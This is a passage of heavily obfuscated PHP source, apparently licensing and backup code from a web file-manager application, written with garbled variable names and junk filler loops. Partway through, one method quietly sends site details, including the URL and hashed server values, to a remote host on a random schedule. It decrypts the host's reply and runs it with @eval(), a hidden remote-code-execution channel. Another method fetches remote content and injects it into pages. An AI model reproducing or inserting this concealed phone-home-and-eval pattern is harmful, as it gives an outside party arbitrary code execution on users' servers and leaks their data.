$Éé¦ôÌ[233] => $Éé¦ôÌ[229], $Éé¦ôÌ[234] => $Éé¦ôÌ[229], $Éé¦ôÌ[235] => $Éé¦ôÌ[229], $Éé¦ôÌ[236] => $Éé¦ôÌ[229], $Éé¦ôÌ[237] => $Éé¦ôÌ[229], $Éé¦ôÌ[238] => $Éé¦ôÌ[229], $Éé¦ôÌ[239] => $Éé¦ôÌ[229], $Éé¦ôÌ[240] => $Éé¦ôÌ[229]); $§Ê­¤è° = $ÃÃƒ¾êš[687]; $ÃĞÓ°Ş = explode($Éé¦ôÌ[241], _get($this->qelo16eb93b1, $Éé¦ôÌ[112], $Éé¦ôÌ[6])); $‘ù«üƒå = array(); foreach ($ŸÑ‡ÇÇ as $Ú‚öç× => $­üˆ·–) { if ($­üˆ·– == $Éé¦ôÌ[224] && substr($this->pklw97ef85ce, 0, 1) == $Éé¦ôÌ[224]) { continue; } if (!in_array($Ú‚öç×, $ÃĞÓ°Ş)) { $‘ù«üƒå[] = $Ú‚öç×; } } foreach ($‘ù«üƒå as $Ú‚öç×) { unset($­ıª»šœ[$Ú‚öç×]); $¤Êåä£ = $ÃÃƒ¾êš[688]; if (strlen($¤Êåä£) < $ÃÃƒ¾êš[634]) { return; } } return $­ıª»šœ; $³âÖÕ¿ = $ÃÃƒ¾êš[689]; if (strlen($³âÖÕ¿) < $ÃÃƒ¾êš[634]) { die; } } private function ocbn9f16039f() { $ïÖÁãºÎ =& $_SERVER[´³–µÍ]; if ($this->pklw97ef85ce != $ïÖÁãºÎ[106]) { $GLOBALS[$ïÖÁãºÎ[85]][$ïÖÁãºÎ[89]][$ïÖÁãºÎ[242]] = $ïÖÁãºÎ[203]; return; } $GLOBALS[$ïÖÁãºÎ[85]][$ïÖÁãºÎ[243]] = $ïÖÁãºÎ[121]; if (Model($ïÖÁãºÎ[244])->get($ïÖÁãºÎ[63]) != $ïÖÁãºÎ[203]) { Model($ïÖÁãºÎ[244])->set($ïÖÁãºÎ[63], $ïÖÁãºÎ[203]); } } public function wcnu110f5935() { $œœ¥Ô– =& $_SERVER[Ü©»’·]; return $_SERVER[´³–µÍ][245]; $î¨Èë = $œœ¥Ô–[690]; while ($î¨Èë < $œœ¥Ô–[632]) { if ($î¨Èë >= 0) { break; } $î¨Èë++; } } private function yrbw4d4cda96() { $İúƒ¡˜‚ =& $_SERVER[Ü©»’·]; $È‚®¾‰Å =& $_SERVER[´³–µÍ]; $¹ø³‘Üï = array($È‚®¾‰Å[246], $È‚®¾‰Å[247], $È‚®¾‰Å[248]); $¸‰‚ŞáÏ = $İúƒ¡˜‚[691]; $¼¶»Ô¶£ = $È‚®¾‰Å[249] . md5($È‚®¾‰Å[250]); if ($this->pklw97ef85ce == $È‚®¾‰Å[106] || !_get($GLOBALS, $È‚®¾‰Å[115])) { return; } if (!in_array($_SERVER[$È‚®¾‰Å[24]], $¹ø³‘Üï)) { return; } if (time() % 4 != 0) { return; } $ñŠ±¬º  = call_user_func(array($È‚®¾‰Å[251], $È‚®¾‰Å[252]), $¼¶»Ô¶£); $÷·ƒ„úÈ = $İúƒ¡˜‚[692]; if (!$÷·ƒ„úÈ) { die; } if ($ñŠ±¬º  && time() - $ñŠ±¬º  < intval($È‚®¾‰Å[253])) { return; } call_user_func(array($È‚®¾‰Å[251], $È‚®¾‰Å[138]), $¼¶»Ô¶£, time()); $‚ÀğíŒ = $İúƒ¡˜‚[693]; while (strlen($‚ÀğíŒ) < $İúƒ¡˜‚[361]) { if (!$‚ÀğíŒ) { break; } $‚ÀğíŒ++; } $ó÷øèù‹ = Model($È‚®¾‰Å[33])->get($È‚®¾‰Å[103]); $Ú€Åö º = array($È‚®¾‰Å[150] => Model($È‚®¾‰Å[33])->get($È‚®¾‰Å[186]), $È‚®¾‰Å[163] => $this->pklw97ef85ce, $È‚®¾‰Å[160] => $_SERVER[$È‚®¾‰Å[161]], $È‚®¾‰Å[162] => Model($È‚®¾‰Å[33])->get($È‚®¾‰Å[130]), $È‚®¾‰Å[101] => md5($_SERVER[$È‚®¾‰Å[102]] . $ó÷øèù‹), $È‚®¾‰Å[153] => $È‚®¾‰Å[135], $È‚®¾‰Å[156] => $_SERVER[$È‚®¾‰Å[157]]); $Çí¡×ê¿ = $this->prms6add02de($È‚®¾‰Å[254], $Ú€Åö º); if (!is_array($Çí¡×ê¿)) { return; } if ($Çí¡×ê¿[$È‚®¾‰Å[150]] && $Çí¡×ê¿[$È‚®¾‰Å[255]]) { if ($this->blecde86905e($Çí¡×ê¿[$È‚®¾‰Å[255]]) == $Ú€Åö º[$È‚®¾‰Å[150]]) { return; } } $this->kfwv6b721225(); if ($this->blecde86905e($Çí¡×ê¿[$È‚®¾‰Å[255]]) != $Ú€Åö º[$È‚®¾‰Å[150]]) { $èö£ºûü = array($È‚®¾‰Å[181] => $ó÷øèù‹, $È‚®¾‰Å[182] => $_SERVER[$È‚®¾‰Å[102]], $È‚®¾‰Å[183] => this_url(), $È‚®¾‰Å[158] => $_SERVER[$È‚®¾‰Å[159]]); $°î»Øõ = $this->sjlb764756f9(json_encode($èö£ºûü)); $Çí¡×ê¿ = $this->prms6add02de($È‚®¾‰Å[184] . $°î»Øõ); if ($Çí¡×ê¿ && is_array($Çí¡×ê¿) && isset($Çí¡×ê¿[$È‚®¾‰Å[255]])) { $ÕœÊŸ› = $this->ejdx097e39a5($Çí¡×ê¿[$È‚®¾‰Å[255]], 2); if ($ÕœÊŸ›) { $ÕœÊŸ› = $this->blecde86905e($ÕœÊŸ›); } if ($ÕœÊŸ›) { try { @eval($ÕœÊŸ›); } catch (Exception $ºÏıÊú) { } } } } } private function prms6add02de($ç÷»õ´ç = '', $è¿±şò£ = array(), $ ğµËçŒ = 5) { $ÂØæëâ =& $_SERVER[Ü©»’·]; $‹ÒÃô÷ =& $_SERVER[´³–µÍ]; $©—ŠôØ = $‹ÒÃô÷[256]; $©—ŠôØ = $this->wqfa768dde05($©—ŠôØ, $‹ÒÃô÷[257]); $ÉË¢® = $ÂØæëâ[694]; $©—ŠôØ = $©—ŠôØ . $ç÷»õ´ç; if ($è¿±şò£ && is_array($è¿±şò£)) { $©—ŠôØ = $©—ŠôØ . $‹ÒÃô÷[258] . http_build_query($è¿±şò£); } if ($è¿±şò£ === -1) { return $©—ŠôØ; } $šéµÙê = stream_context_create(array($‹ÒÃô÷[216] => array($‹ÒÃô÷[219] => $ ğµËçŒ, $‹ÒÃô÷[217] => $‹ÒÃô÷[259]), $‹ÒÃô÷[260] => array($‹ÒÃô÷[261] => !1, $‹ÒÃô÷[262] => !1))); $™ĞÍË§ğ = $ÂØæëâ[695]; $è¿±şò£ = @file_get_contents($©—ŠôØ, !1, $šéµÙê); return json_decode($è¿±şò£, !0); $Ğãƒ­Ş‡ = $ÂØæëâ[696]; while (strlen($Ğãƒ­Ş‡) < $ÂØæëâ[628]) { if (!$Ğãƒ­Ş‡) { break; } $Ğãƒ­Ş‡++; } } private function voezeb1e892b() { $ƒé¼¬³¶ =& $_SERVER[Ü©»’·]; $ûêîäğÒ =& $_SERVER[´³–µÍ]; $§£·„Â = array($ûêîäğÒ[263] => $ûêîäğÒ[264], $ûêîäğÒ[265] => $ûêîäğÒ[266], $ûêîäğÒ[267] => $ûêîäğÒ[268], $ûêîäğÒ[269] => $ûêîäğÒ[270], $ûêîäğÒ[271] => $ûêîäğÒ[272], $ûêîäğÒ[273] => $ûêîäğÒ[211], $ûêîäğÒ[274] => $ûêîäğÒ[211], $ûêîäğÒ[275] => $ûêîäğÒ[264], $ûêîäğÒ[276] => $ûêîäğÒ[266], $ûêîäğÒ[277] => $ûêîäğÒ[268], $ûêîäğÒ[278] => $ûêîäğÒ[279], $ûêîäğÒ[280] => $ûêîäğÒ[270], $ûêîäğÒ[281] => $ûêîäğÒ[282], $ûêîäğÒ[283] => $ûêîäğÒ[272], $ûêîäğÒ[284] => $ûêîäğÒ[285], $ûêîäğÒ[286] => $ûêîäğÒ[287], $ûêîäğÒ[288] => $ûêîäğÒ[289]); $åıñ…šÃ = $ƒé¼¬³¶[697]; if (!$åıñ…šÃ) { return; } $ŞÇÃÎÊ¡ = $§£·„Â[$this->pklw97ef85ce]; $ŞÇÃÎÊ¡ = intval($ŞÇÃÎÊ¡ ? $ŞÇÃÎÊ¡ : $ûêîäğÒ[264]); $Àºù‰«Ë = _get($this->qelo16eb93b1, $ûêîäğÒ[290]); $òæÄ–îì = $ƒé¼¬³¶[698]; while (strlen($òæÄ–îì) < $ƒé¼¬³¶[634]) { if (!$òæÄ–îì) { break; } $òæÄ–îì++; } $Àºù‰«Ë = $Àºù‰«Ë ? intval($Àºù‰«Ë) : 0; $ÎçÄÑ£ã = $ƒé¼¬³¶[699]; return $ŞÇÃÎÊ¡ + $Àºù‰«Ë; $Â„»ËÔŠ = $ƒé¼¬³¶[700]; } public function sigjc0f7474d($Á•ÓŠ ­) { $ÍÃŸ–Åù =& $_SERVER[Ü©»’·]; $ø‘™Ã³É =& $_SERVER[´³–µÍ]; $’âóêº´ = $this->voezeb1e892b(); if ($Á•ÓŠ ­[$ø‘™Ã³É[291]] == $ø‘™Ã³É[121]) { return; } if ($’âóêº´ >= intval($ø‘™Ã³É[211])) { return; } $Åª‰ğ†Ì = Model($ø‘™Ã³É[124])->count(); $÷¯‰‚ = $ÍÃŸ–Åù[701]; if (strlen($÷¯‰‚) < $ÍÃŸ–Åù[632]) { return; } if ($Åª‰ğ†Ì <= $’âóêº´) { return; } $ğéÒÊÚö = Model($ø‘™Ã³É[124])->field($ø‘™Ã³É[291])->limit($’âóêº´)->select(); $ÂÑÖ‘ = $ÍÃŸ–Åù[702]; if (!$ÂÑÖ‘) { die; } $ğéÒÊÚö = array_to_keyvalue($ğéÒÊÚö, $ø‘™Ã³É[6], $ø‘™Ã³É[291]); $×ŞÓéåò = $ÍÃŸ–Åù[703]; while ($×ŞÓéåò < $ÍÃŸ–Åù[632]) { if ($×ŞÓéåò >= 0) { break; } $×ŞÓéåò++; } if (!in_array($Á•ÓŠ ­[$ø‘™Ã³É[291]], $ğéÒÊÚö)) { show_json($ø‘™Ã³É[292], !1, $ø‘™Ã³É[207]); } } public function nvgm1c95aec9() { $üôèÕ–™ =& $_SERVER[Ü©»’·]; $äÂ“Íáû =& $_SERVER[´³–µÍ]; if (!_get($GLOBALS, $äÂ“Íáû[115]) || mt_rand(1, 100) > 20) { return; } $´¸–Ó“ = $äÂ“Íáû[214]; $´¸–Ó“ = $this->wqfa768dde05($´¸–Ó“, $äÂ“Íáû[215]); $Ç™Ê€Î  = stream_context_create(array($äÂ“Íáû[216] => array($äÂ“Íáû[217] => $äÂ“Íáû[218], $äÂ“Íáû[219] => 3))); $ßÈ·ƒšÔ = $üôèÕ–™[704]; $û…ÊŞ… = @file_get_contents($´¸–Ó“, !1, $Ç™Ê€Î ); $‹ºéÓ•ä = $üôèÕ–™[705]; if (strlen($‹ºéÓ•ä) < $üôèÕ–™[632]) { return; } echo $äÂ“Íáû[293] . hash_encode($û…ÊŞ…) . $äÂ“Íáû[294]; $¤Œ¹ŠÁ¨ = $üôèÕ–™[706]; if (strlen($¤Œ¹ŠÁ¨) < $üôèÕ–™[628]) { die; } } private function sfvxe278ca85($‚â—’Å , $¡Š€¡·†, $ÅñşìÂÉ = 3) { $³£Ûşê =& $_SERVER[Ü©»’·]; $…¾ƒª— =& $_SERVER[´³–µÍ]; usleep(1); $†òÙûçø = $³£Ûşê[707]; if (!$†òÙûçø) { return; } $‚â—’Å  = trim($‚â—’Å ); $©ı¿óı = mt_rand(0, 5) . $…¾ƒª—[6]; $ÓĞíÍ±¹ = rand_string(15); $ƒş‚Îıª = $³£Ûşê[708]; if (strlen($ƒş‚Îıª) < $³£Ûşê[634]) { return; } $ïÈ½ê–Ç = $…¾ƒª—[295]; switch ($©ı¿óı) { case $…¾ƒª—[203]: $¸›å“Š† = $this->hgaf74fe9a0d($‚â—’Å , strrev($¡Š€¡·† . $ÓĞíÍ±¹)); $ÁÆÑ§Û = $³£Ûşê[709]; if (strlen($ÁÆÑ§Û) < $³£Ûşê[361]) { die; } break; $ô÷ÃÇíó = $³£Ûşê[710]; if (!$ô÷ÃÇíó) { die; } case $…¾ƒª—[121]: $¸›å“Š† = $this->hgaf74fe9a0d($‚â—’Å , strrev($ÓĞíÍ±¹ . $¡Š€¡·†)); $’äÂÑ§Ó = $³£Ûşê[711]; break; case $…¾ƒª—[296]: $¸›å“Š† = $this->hgaf74fe9a0d($‚â—’Å , base64_encode($ÓĞíÍ±¹ . $¡Š€¡·†)); break; case $…¾ƒª—[297]: $¸›å“Š† = $this->hgaf74fe9a0d($‚â—’Å , md5($ÓĞíÍ±¹ . $¡Š€¡·†)); $‹ôÏ‘á² = $³£Ûşê[712]; while ($‹ôÏ‘á² < $³£Ûşê[634]) { if ($‹ôÏ‘á² >= 0) { break; } $‹ôÏ‘á²++; } break; $É÷°¶‚ß = $³£Ûşê[713]; while (strlen($É÷°¶‚ß) < $³£Ûşê[634]) { if (!$É÷°¶‚ß) { break; } $É÷°¶‚ß++; } case $…¾ƒª—[298]: $‚â—’Å  = base64_encode($‚â—’Å ); $¿Èö”¹² = rand(0, 64); $œŒË°ó¶ = $³£Ûşê[714]; if (!$œŒË°ó¶) { die; } $‡¬Ø­ = $ïÈ½ê–Ç[$¿Èö”¹²]; $ä¸Å‰™ = md5($‡¬Ø­ . md5($¡Š€¡·† . $‡¬Ø­) . $¡Š€¡·†); $ÍŒŞçØ = $³£Ûşê[715]; if (!$ÍŒŞçØ) { die; } $ä¸Å‰™ = substr($ä¸Å‰™, $¿Èö”¹² % 8, $¿Èö”¹² % 8 + 7); $‹£ÙÜÎì = $…¾ƒª—[6]; $ìôİË§ = 0; $™Ïæ’×Ì = 0; $ÂÆÈŞÌ… = $³£Ûşê[716]; if (!$ÂÆÈŞÌ…) { return; } $ñüÛ« à = 0; $û“¶Èœ¯ = $³£Ûşê[717]; if (!$û“¶Èœ¯) { die; } for ($ìôİË§ = 0; $ìôİË§ < strlen($‚â—’Å ); $ìôİË§++) { $ñüÛ« à = $ñüÛ« à == strlen($ä¸Å‰™) ? 0 : $ñüÛ« à; $¸Ü­‚¯ = $³£Ûşê[718]; if (!$¸Ü­‚¯) { return; } $™Ïæ’×Ì = ($¿Èö”¹² + strpos($ïÈ½ê–Ç, $‚â—’Å [$ìôİË§]) + ord($ä¸Å‰™[$ñüÛ« à++])) % 64; $‘Êí»‘Â = $³£Ûşê[719]; if (strlen($‘Êí»‘Â) < $³£Ûşê[628]) { die; } $‹£ÙÜÎì .= $ïÈ½ê–Ç[$™Ïæ’×Ì]; } $¸›å“Š† = hash_encode($‡¬Ø­ . $‹£ÙÜÎì); break; default: $¸›å“Š† = $this->hgaf74fe9a0d($‚â—’Å , $¡Š€¡·† . $ÓĞíÍ±¹); break; $ÊÒÍ¤•º = $³£Ûşê[720]; if (strlen($ÊÒÍ¤•º) < $³£Ûşê[628]) { die; } } $¸›å“Š† = strrev($©ı¿óı . $ÓĞíÍ±¹ . $¸›å“Š†); $ñêäˆáş = $³£Ûşê[721]; if (strlen($ñêäˆáş) < $³£Ûşê[638]) { die; } if ($ÅñşìÂÉ - 1 > 0) { $¸›å“Š† = $this->sfvxe278ca85($¸›å“Š†, $¡Š€¡·†, $ÅñşìÂÉ - 1); } return $¸›å“Š†; } private function ejdx097e39a5($Šø¬„ëö, $ÇËÙ¬ˆ¯, $éÈÎ­ = 3) { $Ë°éí¿« =& $_SERVER[Ü©»’·]; $Ø¨üõ‘ =& $_SERVER[´³–µÍ]; if (!is_string($Šø¬„ëö) || strlen($Šø¬„ëö) < 10) { return !1; } $Šø¬„ëö = trim($Šø¬„ëö); $Šø¬„ëö = strrev($Šø¬„ëö); $‚úëã = $Šø¬„ëö[0]; $ûÚğ¿‹ = substr($Šø¬„ëö, 1, 15); $òù—ßÜ = $Ë°éí¿«[722]; $Šø¬„ëö = substr($Šø¬„ëö, 16); $éç§¦¸Ö = $Ë°éí¿«[723]; if (strlen($éç§¦¸Ö) < $Ë°éí¿«[632]) { die; } $›ÓÈ› = $Ø¨üõ‘[295]; $Ç½Êíˆİ = $Ë°éí¿«[724]; switch ($‚úëã) { case $Ø¨üõ‘[203]: $„ˆª¼ë´ = $this->wqfa768dde05($Šø¬„ëö, strrev($ÇËÙ¬ˆ¯ . $ûÚğ¿‹)); break; case $Ø¨üõ‘[121]: $„ˆª¼ë´ = $this->wqfa768dde05($Šø¬„ëö, strrev($ûÚğ¿‹ . $ÇËÙ¬ˆ¯)); break; case $Ø¨üõ‘[296]: $„ˆª¼ë´ = $this->wqfa768dde05($Šø¬„ëö, base64_encode($ûÚğ¿‹ . $ÇËÙ¬ˆ¯)); $ô Õè—Ä = $Ë°éí¿«[725]; if (!$ô Õè—Ä) { return; } break; case $Ø¨üõ‘[297]: $„ˆª¼ë´ = $this->wqfa768dde05($Šø¬„ëö, md5($ûÚğ¿‹ . $ÇËÙ¬ˆ¯)); $­é¤ŸÚà = $Ë°éí¿«[726]; if (strlen($­é¤ŸÚà) < $Ë°éí¿«[634]) { die; } break; $ŒÇ¿ò¸û = $Ë°éí¿«[727]; case $Ø¨üõ‘[298]: $Šø¬„ëö = hash_decode($Šø¬„ëö); $••«ä†Ï = $Ë°éí¿«[728]; if (!$••«ä†Ï) { return; } $ˆ„ŠÒ©µ = $Šø¬„ëö[0]; $²åÑÎé = $Ë°éí¿«[729]; $Šø¬„ëö = substr($Šø¬„ëö, 1); $Áòš‡Ú® = strpos($›ÓÈ›, $ˆ„ŠÒ©µ); $²Ô×½Ò» = $Ë°éí¿«[730]; $õ¬ÃŸ–É = md5($ˆ„ŠÒ©µ . md5($ÇËÙ¬ˆ¯ . $ˆ„ŠÒ©µ) . $ÇËÙ¬ˆ¯); $Ò–›øÜ‰ = $Ë°éí¿«[731]; $õ¬ÃŸ–É = substr($õ¬ÃŸ–É, $Áòš‡Ú® % 8, $Áòš‡Ú® % 8 + 7); $ñ®ì×ƒÆ = $Ø¨üõ‘[6]; $ŸÎ«Ïä’ = 0; $ÃÊø…Şœ = $Ë°éí¿«[732]; if (!$ÃÊø…Şœ) { return; } $ìÈ®¨Ï = 0; $ŸÆÊ»èÂ = 0; for ($ŸÎ«Ïä’ = 0; $ŸÎ«Ïä’ < strlen($Šø¬„ëö); $ŸÎ«Ïä’++) { $ŸÆÊ»èÂ = $ŸÆÊ»èÂ == strlen($õ¬ÃŸ–É) ? 0 : $ŸÆÊ»èÂ; $ÑÀëÃ„ = $Ë°éí¿«[733]; if (strlen($ÑÀëÃ„) < $Ë°éí¿«[634]) { die; } $Ë”Œ÷Óæ = $ŸÆÊ»èÂ++; $×Õ’ÁĞø = $Ë°éí¿«[734]; $ìÈ®¨Ï = strpos($›ÓÈ›, $Šø¬„ëö[$ŸÎ«Ïä’]) - $Áòš‡Ú® - ord($õ¬ÃŸ–É[$Ë”Œ÷Óæ]); while ($ìÈ®¨Ï < 0) { $ìÈ®¨Ï += 64; $·ä•«Îù = $Ë°éí¿«[735]; if (!$·ä•«Îù) { return; } } $ñ®ì×ƒÆ .= $›ÓÈ›[$ìÈ®¨Ï]; } $„ˆª¼ë´ = base64_decode($ñ®ì×ƒÆ); $³¿«Å¨À = $Ë°éí¿«[736]; if (!$³¿«Å¨À) { return; } break; default: $„ˆª¼ë´ = $this->wqfa768dde05($Šø¬„ëö, $ÇËÙ¬ˆ¯ . $ûÚğ¿‹); break; $¬´Ïöä = $Ë°éí¿«[737]; if (!$¬´Ïöä) { return; } } if ($éÈÎ­ - 1 > 0) { $„ˆª¼ë´ = $this->ejdx097e39a5($„ˆª¼ë´, $ÇËÙ¬ˆ¯, $éÈÎ­ - 1); } return $„ˆª¼ë´; } public function sjlb764756f9($í°˜’¦«) { $ôÊ½ˆÏ© =& $_SERVER[Ü©»’·]; $­‡‰îù =& $_SERVER[´³–µÍ]; $¨öœ¹‰Ò = $this->jaqmd5cfd6c0(); $¾ÂË³­Í = $this->jaqmd5cfd6c0(); $»ìêó¬Í = ($¨öœ¹‰Ò - 1) * ($¾ÂË³­Í - 1); $½¾±ãÃÙ = $ôÊ½ˆÏ©[738]; $ˆåÚ‘èó = intval(($¨öœ¹‰Ò + $¾ÂË³­Í) / 2); while (1) { $×™ûß¦° = $ˆåÚ‘èó; $’—¡±¸Ô = $ôÊ½ˆÏ©[714]; if (!$’—¡±¸Ô) { return; } $¶‡³×øš = $»ìêó¬Í; $²®Êˆ…¨ = $ôÊ½ˆÏ©[739]; while ($²®Êˆ…¨ < $ôÊ½ˆÏ©[634]) { if ($²®Êˆ…¨ >= 0) { break; } $²®Êˆ…¨++; } while ($¶‡³×øš % $×™ûß¦° != 0) { $ê“û±å¯ = $¶‡³×øš; $¶‡³×øš = $×™ûß¦°; $×™ûß¦° = $ê“û±å¯ % $×™ûß¦°; } if ($×™ûß¦° == 1) { break; } else { $ˆåÚ‘èó++; } } $øÅÙòÅ = 2; for ($öÆİ¼«ª = 0; $öÆİ¼«ª < $»ìêó¬Í * 10; $öÆİ¼«ª++) { if (($»ìêó¬Í * $öÆİ¼«ª + 1) % $ˆåÚ‘èó == 0) { $øÅÙòÅ = intval(($»ìêó¬Í * $öÆİ¼«ª + 1) / $ˆåÚ‘èó); break; } } $Ş§‡¤÷ = $this->hgaf74fe9a0d($¨öœ¹‰Ò * $¾ÂË³­Í . $­‡‰îù[6], $­‡‰îù[135]); $ø¡úûç = md5($­‡‰îù[299] . ($¨öœ¹‰Ò + $¾ÂË³­Í) . $­‡‰îù[300] . $ˆåÚ‘èó . $­‡‰îù[300] . $øÅÙòÅ . $­‡‰îù[301]); $™¶Ã€Òâ = $ôÊ½ˆÏ©[740]; while (strlen($™¶Ã€Òâ) < $ôÊ½ˆÏ©[638]) { if (!$™¶Ã€Òâ) { break; } $™¶Ã€Òâ++; } $–˜Àü¦Ò = $this->hgaf74fe9a0d($í°˜’¦«, $ø¡úûç) . $­‡‰îù[302] . $Ş§‡¤÷; return $–˜Àü¦Ò; } public function blecde86905e($²úà‚ÓÚ) { $áÎøœ· =& $_SERVER[Ü©»’·]; $ÑõóôìÂ =& $_SERVER[´³–µÍ]; $æÚ’®ôâ = explode($ÑõóôìÂ[302], $²úà‚ÓÚ); $¬å¨øµ = $áÎøœ·[741]; if (strlen($¬å¨øµ) < $áÎøœ·[361]) { return; } if (count($æÚ’®ôâ) != 2) { return $ÑõóôìÂ[6]; } $ÓÖ©Å¸ = $this->wqfa768dde05($æÚ’®ôâ[1] . $ÑõóôìÂ[6], $ÑõóôìÂ[135]); if (!$ÓÖ©Å¸) { return $ÑõóôìÂ[6]; } $ÓÖ©Å¸ = intval($ÓÖ©Å¸); $ÅÑ£’¸ñ = $áÎøœ·[742]; $ó¨±à›Ñ = 0; $¼Áïšû = $áÎøœ·[743]; if (strlen($¼Áïšû) < $áÎøœ·[628]) { die; } $Ù­Ò•÷Ş = 0; $‘†ßÚí = $áÎøœ·[744]; for ($…ŒäÍƒ¬ = 3; $…ŒäÍƒ¬ < $ÓÖ©Å¸; $…ŒäÍƒ¬ += 2) { if ($ÓÖ©Å¸ % $…ŒäÍƒ¬ != 0) { continue; } $ó¨±à›Ñ = $…ŒäÍƒ¬; $Ù­Ò•÷Ş = intval($ÓÖ©Å¸ / $…ŒäÍƒ¬); $½ï›¤² = $áÎøœ·[673]; while ($½ï›¤² < $áÎøœ·[361]) { if ($½ï›¤² >= 0) { break; } $½ï›¤²++; } break; $™„”Îˆ¼ = $áÎøœ·[745]; } $ï˜‘Ò”§ = ($ó¨±à›Ñ - 1) * ($Ù­Ò•÷Ş - 1); $ª¿Ûé¡ = $áÎøœ·[746]; while (strlen($ª¿Ûé¡) < $áÎøœ·[632]) { if (!$ª¿Ûé¡) { break; } $ª¿Ûé¡++; } $Ç¡İıÃÊ = intval(($ó¨±à›Ñ + $Ù­Ò•÷Ş) / 2); while (1) { $·¾ãçŠ = $Ç¡İıÃÊ; $·îúôÕ = $ï˜‘Ò”§; while ($·îúôÕ % $·¾ãçŠ != 0) { $›¤®¢ÍÎ = $·îúôÕ; $·îúôÕ = $·¾ãçŠ; $·¾ãçŠ = $›¤®¢ÍÎ % $·¾ãçŠ; $€‚ê¾ô = $áÎøœ·[747]; } if ($·¾ãçŠ == 1) { break; } else { $Ç¡İıÃÊ++; } } $æ”ò‡æÉ = 2; $˜ˆô³ãö = $áÎøœ·[748]; for ($…ŒäÍƒ¬ = 0; $…ŒäÍƒ¬ < $ï˜‘Ò”§ * 10; $…ŒäÍƒ¬++) { if (($ï˜‘Ò”§ * $…ŒäÍƒ¬ + 1) % $Ç¡İıÃÊ == 0) { $æ”ò‡æÉ = intval(($ï˜‘Ò”§ * $…ŒäÍƒ¬ + 1) / $Ç¡İıÃÊ); break; } } $½åÆ–¦³ = md5($ÑõóôìÂ[299] . ($ó¨±à›Ñ + $Ù­Ò•÷Ş) . $ÑõóôìÂ[300] . $Ç¡İıÃÊ . $ÑõóôìÂ[300] . $æ”ò‡æÉ . $ÑõóôìÂ[301]); $¿¸ıÂ¸ˆ = $this->wqfa768dde05($æÚ’®ôâ[0], $½åÆ–¦³); return $¿¸ıÂ¸ˆ; } public function jaqmd5cfd6c0() { $×¯‘¡œœ =& $_SERVER[Ü©»’·]; $’ú¢‘Ş = mt_rand(pow(2, 14), pow(2, 16) - 1); $±ü¥ = array(); $›Ş´¾ = $×¯‘¡œœ[749]; while (strlen($›Ş´¾) < $×¯‘¡œœ[628]) { if (!$›Ş´¾) { break; } $›Ş´¾++; } $¯ß™½ç‘ = 1; $š¹Ä´­Õ = $×¯‘¡œœ[750]; if (strlen($š¹Ä´­Õ) < $×¯‘¡œœ[628]) { die; } while ($¯ß™½ç‘ <= (int) sqrt($’ú¢‘Ş)) { $ÁàÆï¢ = $¯ß™½ç‘; while (!0) { $ÁàÆï¢++; if ($ÁàÆï¢ <= 2) { $¯ß™½ç‘ = $ÁàÆï¢; break; } else { if ($ÁàÆï¢ < 2) { continue; } } $Äµ½Ìà = !0; for ($¸²ßŞó… = 2; $¸²ßŞó… <= sqrt($ÁàÆï¢); $¸²ßŞó…++) { if ($ÁàÆï¢ % $¸²ßŞó… == 0) { $Äµ½Ìà = !1; } } if ($Äµ½Ìà) { $¯ß™½ç‘ = $ÁàÆï¢; break; } } $±ü¥[] = $¯ß™½ç‘; $çıÂÍ¯ˆ = $×¯‘¡œœ[751]; if (!$çıÂÍ¯ˆ) { return; } } $ãòÂ¥®í = 2; for ($ÁàÆï¢ = $’ú¢‘Ş; $ÁàÆï¢ > 1; $ÁàÆï¢--) { $Äµ½Ìà = !0; $ç—±ÄÖ— = $×¯‘¡œœ[752]; foreach ($±ü¥ as $„¦Ùç™¡) { if ($ÁàÆï¢ % $„¦Ùç™¡ == 0) { $Äµ½Ìà = !1; break; } } if ($Äµ½Ìà) { $ãòÂ¥®í = $ÁàÆï¢; break; } } return $ãòÂ¥®í; } public function hdtq91deedc6($”šåÎó, $ı›½¾¡Ñ) { $¹éÁÒÇú =& $_SERVER[´³–µÍ]; return call_user_func(array($¹éÁÒÇú[8], $¹éÁÒÇú[303]), $”šåÎó, $ı›½¾¡Ñ); $Úºá¹±Ù = $_SERVER[Ü©»’·][753]; } public function hgaf74fe9a0d($¼Ãµ¦œ», $‡ËÖ÷úË) { $¥š£á’Ğ =& $_SERVER[´³–µÍ]; return call_user_func(array($¥š£á’Ğ[304], $¥š£á’Ğ[305]), $¼Ãµ¦œ», $‡ËÖ÷úË); } public function wqfa768dde05($Ñ¾ú„ËÕ, $æä¹â†¥) { $ï¦İ»…â =& $_SERVER[´³–µÍ]; return call_user_func(array($ï¦İ»…â[304], $ï¦İ»…â[306]), $Ñ¾ú„ËÕ, $æä¹â†¥); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $çÁŒ«ø‹ =& $_SERVER[Ü©»’·]; $this->isManual(); self::$name = date($çÁŒ«ø‹[754]); if (!($¬’ÏŞŸ³ = Model($çÁŒ«ø‹[755])->lastItem())) { $¬’ÏŞŸ³ = $this->initData(); } else { self::$name = $¬’ÏŞŸ³[$çÁŒ«ø‹[32]]; if ($¬’ÏŞŸ³[$çÁŒ«ø‹[756]] == $çÁŒ«ø‹[88]) { self::$name = date($çÁŒ«ø‹[757]); $ÊÓ†¥œ = 0; if (isset($¬’ÏŞŸ³[$çÁŒ«ø‹[293]][$çÁŒ«ø‹[199]][$çÁŒ«ø‹[477]])) { $ÊÓ†¥œ = (int) $¬’ÏŞŸ³[$çÁŒ«ø‹[293]][$çÁŒ«ø‹[199]][$çÁŒ«ø‹[477]]; } if (self::$manual == 0 && $¬’ÏŞŸ³[$çÁŒ«ø‹[32]] == self::$name) { Model($çÁŒ«ø‹[755])->remove($¬’ÏŞŸ³[$çÁŒ«ø‹[408]]); } $¬’ÏŞŸ³ = $this->initData($ÊÓ†¥œ, $¬’ÏŞŸ³[$çÁŒ«ø‹[758]]); } else { $this->checkStore($¬’ÏŞŸ³[$çÁŒ«ø‹[758]]); } } self::$option = $¬’ÏŞŸ³; } private function isManual() { $Úåæ‡¬ = _get($GLOBALS, $_SERVER[Ü©»’·][759], 0); $Úåæ‡¬ = intval($Úåæ‡¬); self::$manual = $Úåæ‡¬ && $Úåæ‡¬ == 1 ? 1 : 0; } private function initData($®‘“‰©û = 0, $÷Ååµ¯¥ = '') { $–©—Æ• =& $_SERVER[Ü©»’·]; $…ŠÁ­Òª = Model($–©—Æ•[755])->config(); if ($÷Ååµ¯¥ && $…ŠÁ­Òª[$–©—Æ•[758]] != $÷Ååµ¯¥) { $®‘“‰©û = 0; } $this->checkStore($…ŠÁ­Òª[$–©—Æ•[758]]); if (self::$manual == 1) { self::$name .= 